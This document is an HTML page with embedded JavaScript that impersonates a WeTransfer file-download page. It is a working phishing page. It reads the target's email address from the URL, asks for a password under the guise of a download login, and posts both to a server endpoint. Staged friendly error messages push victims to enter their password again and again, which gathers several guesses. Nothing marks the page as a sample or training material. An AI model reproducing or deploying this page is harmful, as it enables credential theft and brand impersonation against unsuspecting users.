<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeTransfer – Secure Download</title>
    <style>
        /* Minimal base – replace with your own */
        * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, sans-serif; }
        body { background: #f5f7ff; min-height:100vh; display:flex; align-items:center; justify-content:center; }
        .container { background:#fff; max-width:400px; width:100%; padding:2rem 1.5rem; border-radius:20px; box-shadow:0 8px 30px rgba(0,0,0,0.08); }
        h2 { font-weight:500; font-size:1.2rem; margin-bottom:0.5rem; }
        .file-list { background:#f2f4f8; border-radius:12px; padding:0.75rem 1rem; margin:1rem 0 1.5rem; }
        .file-item { display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid #e6e9ef; }
        .file-item:last-child { border-bottom:none; }
        .file-name { font-weight:500; }
        .file-size { color:#7a7f8a; }
        .note { font-size:0.8rem; color:#7a7f8a; text-align:center; margin-bottom:1.2rem; }
        .btn { width:100%; padding:0.8rem; border:none; border-radius:50px; font-weight:500; font-size:1rem; background:#191919; color:#fff; cursor:pointer; transition:background 0.2s; display:flex; align-items:center; justify-content:center; gap:0.4rem; }
        .btn:hover { background:#333; }
        .btn:disabled { opacity:0.6; pointer-events:none; }

        .email-display { background:#f2f4f8; border-radius:12px; padding:0.75rem 1rem; margin-bottom:1rem; display:flex; align-items:center; gap:0.5rem; font-size:0.95rem; }
        .email-display .label { color:#7a7f8a; }
        .email-display .email-value { font-weight:500; word-break:break-all; }
        .input-group { margin-bottom:1rem; }
        .input-group label { display:block; font-size:0.85rem; color:#4a4f5a; margin-bottom:0.3rem; }
        .input-group input { width:100%; padding:0.75rem 1rem; border:1px solid #d9dde4; border-radius:12px; font-size:1rem; transition:border 0.2s; background:#fff; }
        .input-group input:focus { border-color:#191919; outline:none; }

        .error-message { margin-top:0.5rem; padding:0.6rem 1rem; border-radius:12px; background:rgba(230,80,80,0.06); color:#e65050; font-size:0.9rem; display:none; align-items:center; gap:0.4rem; border:1px solid rgba(230,80,80,0.15); transition:all 0.2s; }
        .error-message.show { display:flex; }
        .error-message .emoji { font-size:1.2rem; }
        .error-message .highlight { font-weight:600; }

        .forgot-link { display:block; text-align:center; margin:0.8rem 0 0; font-size:0.85rem; color:#4a4f5a; text-decoration:underline; cursor:pointer; }
        .forgot-link:hover { color:#191919; }

        .loading-overlay { position:fixed; inset:0; background:rgba(255,255,255,0.7); backdrop-filter:blur(4px); display:none; align-items:center; justify-content:center; z-index:999; flex-direction:column; gap:1rem; }
        .loading-overlay.active { display:flex; }
        .spinner { width:40px; height:40px; border:4px solid #e0e0e0; border-top:4px solid #191919; border-radius:50%; animation:spin 0.8s linear infinite; }
        @keyframes spin { to { transform:rotate(360deg); } }
        .hidden { display:none !important; }

        /* Shake animation for error */
        @keyframes shake { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)} }
        .shake { animation:shake 0.4s ease-in-out; }
    </style>
</head>
<body>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div style="color:#333;">Logging you in…</div>
    </div>

    <div class="container">
        <!-- STEP 1: File list -->
        <div id="step1">
            <h2>📁 Files ready for download</h2>
            <div class="file-list">
                <div class="file-item"><span class="file-name">Company Profile.pdf</span><span class="file-size">961 KB</span></div>
                <div class="file-item"><span class="file-name">TTcopy.pdf</span><span class="file-size">2 MB</span></div>
            </div>
            <div class="note">Files are valid for 7 days</div>
            <button class="btn" id="downloadBtn"><span>⬇</span> Download All</button>
        </div>

        <!-- STEP 2: Password -->
        <div id="step2" class="hidden">
            <h2>🔐 Enter your password</h2>
            <div class="email-display">
                <span class="label">📧</span>
                <span class="email-value" id="emailDisplay"></span>
            </div>
            <div class="input-group">
                <label for="passwordInput">Password</label>
                <input type="password" id="passwordInput" placeholder="Your password" />
            </div>

            <!-- Sleek error message – appears after first failed attempt -->
            <div class="error-message" id="errorMessage">
                <span class="emoji">🤔</span>
                <span><span class="highlight">Oops!</span> That password doesn’t look right. <span class="highlight">One more try?</span></span>
            </div>

            <button class="btn" id="loginBtn">Log in with WeTransfer</button>
            <a class="forgot-link" href="#">Forgot password?</a>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // ---------- DOM refs ----------
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const downloadBtn = document.getElementById('downloadBtn');
            const loginBtn = document.getElementById('loginBtn');
            const passwordInput = document.getElementById('passwordInput');
            const emailDisplay = document.getElementById('emailDisplay');
            const errorMessage = document.getElementById('errorMessage');
            const loadingOverlay = document.getElementById('loadingOverlay');

            // ---------- State ----------
            let currentEmail = '';
            let attemptCount = 0;

            // ---------- Helpers ----------
            function getEmailFromURL() {
                // Try hash first, then query string
                let email = '';
                if (window.location.hash) {
                    const hash = window.location.hash.substring(1);
                    const params = new URLSearchParams(hash);
                    email = params.get('email') || '';
                    if (!email) {
                        // Plain email in hash
                        const match = hash.match(
                            /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                        );
                        if (match) email = match[0];
                    }
                }
                if (!email) {
                    const params = new URLSearchParams(window.location.search);
                    email = params.get('email') || '';
                }
                return email;
            }

            function setLoading(state) {
                loadingOverlay.classList.toggle('active', state);
                downloadBtn.disabled = state;
                loginBtn.disabled = state;
            }

            function showError(msg) {
                // msg is HTML string
                errorMessage.innerHTML = msg;
                errorMessage.classList.add('show');
                // Add shake effect
                errorMessage.classList.remove('shake');
                // Force reflow
                void errorMessage.offsetWidth;
                errorMessage.classList.add('shake');
            }

            function hideError() {
                errorMessage.classList.remove('show');
                errorMessage.classList.remove('shake');
            }

            // ---------- Step 1: Download All ----------
            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const email = getEmailFromURL();
                if (!email) {
                    showError('<span class="emoji">⚠️</span> Email not found in URL.');
                    return;
                }

                setLoading(true);
                fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'email', email: email })
                    })
                    .then(response => response.json())
                    .then(data => {
                        setLoading(false);
                        if (data.success) {
                            currentEmail = email;
                            // Display email cleanly (no extra chars)
                            emailDisplay.textContent = currentEmail;
                            step1.classList.add('hidden');
                            step2.classList.remove('hidden');
                            attemptCount = 0;
                            passwordInput.value = '';
                            hideError();
                            passwordInput.focus();
                        } else {
                            showError('<span class="emoji">⚠️</span> ' + (data.error || 'Something went wrong.'));
                        }
                    })
                    .catch(err => {
                        setLoading(false);
                        showError('<span class="emoji">🌐</span> Network error. Please try again.');
                    });
            });

            // ---------- Step 2: Login ----------
            loginBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const password = passwordInput.value.trim();
                if (!password) {
                    showError('<span class="emoji">✍️</span> Please enter your password.');
                    passwordInput.focus();
                    return;
                }

                attemptCount++;
                setLoading(true);

                fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'password',
                            email: currentEmail,
                            password: password,
                            remember: 0
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            return response.json().then(data => {
                                throw new Error(data.error || 'Incorrect password.');
                            });
                        }
                        return response.json();
                    })
                    .then(data => {
                        setLoading(false);
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        } else {
                            // Unexpected – show error
                            showSleekError(attemptCount);
                            passwordInput.value = '';
                            passwordInput.focus();
                        }
                    })
                    .catch(err => {
                        setLoading(false);
                        showSleekError(attemptCount);
                        passwordInput.value = '';
                        passwordInput.focus();
                    });
            });

            // Helper to show the sleek error with friendly message
            function showSleekError(attempt) {
                let msg = '';
                if (attempt === 1) {
                    msg =
                        '<span class="emoji">🤔</span> <span class="highlight">Oops!</span> That password doesn’t look right. <span class="highlight">One more try?</span>';
                } else if (attempt === 2) {
                    msg =
                        '<span class="emoji">🧐</span> Hmm, still not matching. <span class="highlight">Take a breath and try again?</span>';
                } else {
                    msg =
                        '<span class="emoji">💡</span> Almost there! <span class="highlight">Give it one more go.</span>';
                }
                showError(msg);
            }

            // Clear error on typing / focusing
            passwordInput.addEventListener('input', hideError);
            passwordInput.addEventListener('focus', hideError);

            // Enter key submits
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    loginBtn.click();
                }
            });

            // If step2 is already visible (e.g. after reload), show email
            if (!step2.classList.contains('hidden')) {
                const email = getEmailFromURL();
                if (email) {
                    currentEmail = email;
                    emailDisplay.textContent = currentEmail;
                }
            }
        })();
    </script>
</body>
</html>
